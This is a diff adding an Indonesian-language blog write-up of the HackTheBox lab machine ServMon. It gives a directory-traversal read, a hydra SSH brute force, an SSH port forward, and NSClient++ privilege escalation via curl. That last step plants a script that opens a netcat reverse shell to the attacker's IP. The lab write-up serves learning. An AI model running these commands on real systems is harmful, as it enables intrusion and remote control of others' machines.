@@ -47,15 +47,20 @@
 		<h1>servmon htb</h1>
 	</div>
 	<div class="container w-75 p-5 m-5 bg-light rounded text-dark shadow-own" id="article">
+		<strong>Bismillah..</strong> <br>
+		Sebenarnya postingan ini lumayan telat karna mesin sudah retire sekitar seminggu yang lalu... tapi itu bukan menjadi masalah karna tidak ada kata terlambat untuk belajar. <br>
+		Sebagai informasi mesin ini bernama Servmon dengan OS windows dengan total 20 points (easy). Adapun seperti biasanya, tantangan dari HackThebox adalah mengambil alih akses penuh mesin (privilege escalation) untuk mendapatkan user.txt dan root.txt <br> <br>
+		<h1>Intro</h1>
+		Box yang relatif mudah. Masuk ke FTP sebagai anonymous login. Layanan nvms-1000 rentan terhadap eksploitasi publik (Directory Traversal). Membaca file Passwords.txt menggunakan Dir-traversal. Brute Force dan mencoba masuk ke ssh login sebagai Nadine user. Layanan yang berjalan pada port 8443 Nsclient rentan terhadap eksploitasi publik dan kita dapat menggunakannya untuk mendapatkan root
 		<h1>This content</h1>
 		<ul class="content-list">
-			<li><a href="#nmap">nmap port scanning</a></li>
-			<li><a href="#">check anonymous ftp</a></li>
-			<li><a href="#">nvms 1000 path traversal</a></li>
-			<li><a href="#">login Nadine ssh</a></li>
-			<li><a href="#">port forward 8443</a></li>
-			<li><a href="#">upload script nsclient++</a></li>
-			<li><a href="#">execute nsclient++ payload</a></li>
+			<li><a href="#nmap">Nmap port scanning</a></li>
+			<li><a href="#ftp">Check anonymous ftp</a></li>
+			<li><a href="#path-traversal">NVMS 1000 path traversal</a></li>
+			<li><a href="#user">Login Nadine ssh</a></li>
+			<li><a href="#port-forward">Port forward 8443</a></li>
+			<li><a href="#gaining-root">Exploit NSClient++</a></li>
+			<li><a href="#curl">Working with curl</a></li>
 		</ul>
 		<h1>Recon</h1>	
 		
@@ -93,6 +98,77 @@
 			Saya langsung mencari exploit nvms-1000 pada searchsploit
 			<img src="../assets/img/servmon/searchsploit.png" class="py-2 rounded mx-auto d-block img-fluid">
 			atau kita bisa membukanya disini <a href="https://www.exploit-db.com/exploits/47774">https://www.exploit-db.com/exploits/47774</a>
+			<h1>Exploit</h1>
+			Langsung saja karna kita sudah mendapatkan hint yaitu pada file Confidential.txt dimana mengatakan "I left your Password.txt on your Desktop" maka kita hanya mengarahkan ke dalam file C:\Users\Nathan\Desktop\password.txt. Disini saya menggunakan burp suite dan menggunakan mode repeater untuk mengeksploitasinya
+			<img src="../assets/img/servmon/burp.png" class="py-2 rounded mx-auto d-block img-fluid">
+		</section>
+
+		<section id="user">
+			Hmmm... ternyata ada beberapa password yang ada di dalam filenya
+			ini mengharuskan kita untuk membrute forcenya. Disini saya menggunakan hydra, karna ssh terbuka maka kita akan membrute force pada bagian ssh
+			<kbd><code>sudo hydra -l Nadine -P password.txt 10.10.10.184 ssh </code></kbd>
+			<img src="../assets/img/servmon/ssh-brute.png" class="py-2 rounded mx-auto d-block img-fluid">
+			Yap disini kita disini mendapatkan passwordnya: L1k3B1gBut7s@W0rk <br> maka kita langsung saja login melalui ssh dan mendapatkan user flagnya :)<br>
+			<kbd><code>ssh Nadine@10.10.10.184</code></kbd>
+			<div class="container bg-dark p-2 my-2 rounded">
+				<pre>
+Microsoft Windows [Version 10.0.18363.752]          
+(c) 2019 Microsoft Corporation. All rights reserved.
+													
+nadine@SERVMON C:\Users\Nadine> 
+				</pre>
+			</div>
+		</section>
+		<section id="port-forward">
+			Disini yang saya lakukan pertama kali adalah melihat program yang terinstall pada Program Files, dan menemukan NSClient++. Saya pun mencarinya menggunakan searchsploit dan yap.. dapat terdapat privilege escalation exploit pada service tersebut.
+			<img src="../assets/img/servmon/nsclient-exploit.png" class="py-2 rounded mx-auto d-block img-fluid">
+			setelah mengetahui bahwa nsclient++ bekerja pada port 8443, maka saya mencoba melakukan port forward dari ssh ke host pribadi saya. <br>
+			<kbd><code>ssh -L 8443:127.0.0.1:8443 Nadine@10.10.10.184</code></kbd>
+			<br>mengenai tentang port forward ssh kalian bisa membacanya di <a href="https://www.techrepublic.com/article/how-to-use-local-and-remote-ssh-port-forwarding/">https://www.techrepublic.com/article/how-to-use-local-and-remote-ssh-port-forwarding/</a>
+		</section>
+		<h1>Gaining Root access!!!</h1>
+		<section id="gaining-root">
+			Yap.. tinggal sebentar lagi kita akan menyelesaikan box ini :D maka bersiap siaplah mendapatkan sensasinya B). <br>
+			Ikuti instruksi dari refrensi exploit-db diatas, yaitu masuk ke Directory penyimpanan NSClient++ berada lalu lakukan perintah <br>
+			<kbd><code>nscp web -- password --display</code></kbd>
+			<div class="container bg-dark p-2 my-2 rounded">
+				<pre>
+Current password: ew2x6SsGTxjRwXOT
+				</pre>
+			</div>
+			Karena kita sudah melakukan port forward ke host kita maka kita hanya tinggal membukanya di http://127.0.0.1:8443
+			<img src="../assets/img/servmon/web-nsclient.png" class="py-2 rounded mx-auto d-block img-fluid">
+			Sebenarnya disini saya mendapat masalah (webnya gak mau jalan), bahkan bukan saya saja... teman saya yang sudah memakai akun VIP pun sama & akhirnya menyerah.. namun tidak pada saya :) (mungkin ini penyebab box-nya pensiun dini) saya mencari cara dan akhirnya mendapatkan bahwa kita bisa menggunakan API simak <a href="https://docs.nsclient.org/api/rest/">https://docs.nsclient.org/api/rest/</a>
+			
+		</section>
+		<h1>Exploit NSClient++ API using curl</h1>
+
+		<section id="curl">
+			Pertama tama kita perlu mengupload netcat ke dalam mesin target, saya akan menggunakan scp untuk hal ini simak <a href="https://linux4one.com/how-to-use-scp-command-to-transfer-files-folders-in-linux/">https://linux4one.com/how-to-use-scp-command-to-transfer-files-folders-in-linux/</a> <br>
+			netcat: <a href="https://github.com/diegocr/netcat">https://github.com/diegocr/netcat</a> <br>
+			<kbd><code>scp nc.exe Nadine@10.10.10.184:c:\Temp</code></kbd> <br>
+			listening port dengan netcat: <kbd><code>netcat -lvnp 1337</code></kbd> <br>
+			Membuat hook script untuk exploit (ganti dengan ip kalian): <br>
+			<kbd><code>curl -s -k -u admin:ew2x6SsGTxjRwXOT -X PUT https://127.0.0.1:8443/api/v1/scripts/ext/scripts/evil.bat --data-binary "c:\Temp\nc.exe 10.10.14.19 1337 -e cmd.exe"</code></kbd> <br>
+			cek apakah file-nya sudah ada: <br>
+			<kbd><code>curl -s -k -u admin:ew2x6SsGTxjRwXOT https://localhost:8443/api/v1/queries/evil |python -m json.tool</code></kbd>
+			<div class="container bg-dark p-2 my-2 rounded">
+				<pre>
+{
+	"description": "Alias for: scripts\\evil.bat",
+	"execute_nagios_url": "https://localhost:8443/api/v1/queries/evil/commands/execute_nagios",
+	"execute_url": "https://localhost:8443/api/v1/queries/evil/commands/execute",
+	"metadata": {},
+	"name": "evil",
+	"title": "evil"
+} 
+				</pre>
+			</div>
+			File-nya sudah terupload :D mari kita eksekusi!!!<br>
+			<kbd><code>curl -s -k -u admin:ew2x6SsGTxjRwXOT https://127.0.0.1:8443/api/v1/queries/evil/commands/execute?time=1ms</code></kbd> <br>
+			Daaannnn...
+			<img src="../assets/img/servmon/root.png" class="py-2 rounded mx-auto d-block img-fluid">
+			ROOOOOTTTT!!!!
 		</section>
 	</div>
 
